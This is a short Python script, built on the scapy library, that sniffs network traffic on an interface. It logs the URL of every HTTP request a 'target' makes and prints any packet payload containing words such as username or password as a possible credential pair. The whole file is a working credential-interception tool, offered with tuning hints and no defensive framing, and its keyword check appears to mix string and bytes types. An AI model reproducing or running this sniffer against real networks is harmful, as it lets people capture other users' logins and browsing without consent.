#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

# Function to sniff packets
def sniff(interface):
    # prn argument in scapy.sniff() is used to run the function process_sniffed_packet() for every packet sniffed
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


#Function to get the URL of any HTTP website visited by the target 
def get_url(packet):
    # Return the HTTP request URL visited by the target
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path)


#Function to get the login information input by the target on any HTTP website
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "key"] # Add or Remove the Keywords according to your need
        # use packet.show() to get detailed information about the packet, and to view the various layers and fields.
        # use packet.summary() to get summery of the packet. 
        for keyword in keywords:
            if keyword in load:
                return (load)


#default function that is called for every packet sniffed
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # Get the URL of the HTTP request and Print it
        url = get_url(packet)
        print("[+] HTTP Request: "+url)

        # Get the Username and Passwords and Print it
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible Username-Password Combination Detected:\n" + login_info + "\n")


# Call the function to start sniffing
sniff("eth0")#Edit the Interface name here
